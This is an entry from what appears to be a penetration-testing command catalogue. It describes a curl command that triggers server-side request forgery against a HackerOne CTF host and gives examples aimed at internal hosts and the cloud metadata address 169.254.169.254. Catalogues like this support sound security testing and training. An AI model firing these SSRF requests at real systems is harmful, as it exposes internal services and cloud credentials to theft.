---
data: >-
  curl -X POST 'https://bountypay.h1ctf.com/ssrf-endpoint' -d
  'url=http://software.bountypay.h1ctf.com/app-info' -b 'session=AUTH'
tags:
  - ssrf
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.084Z'
id: b2f0c19e-19e3-4db1-a61d-1c3de71e8743
verified: false
validated: true
submitted: true
---
# curl-ssrf-request

## Command

```bash
curl -X POST 'https://bountypay.h1ctf.com/ssrf-endpoint' -d 'url=http://software.bountypay.h1ctf.com/app-info' -b 'session=AUTH'
```

## Description

Triggers SSRF by passing internal URL in POST data. Ideal for discovering hidden services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d url=` | Target internal URL | Yes |
| `-b` | Auth cookie | Yes |

## Examples

### Basic Usage

```bash
curl -d 'url=http://internal' target
```

### Advanced Usage

```bash
curl -d 'url=http://169.254.169.254' -v target
```

## Expected Output

Server response with internal content.

## Related

- [[Related Procedure]]
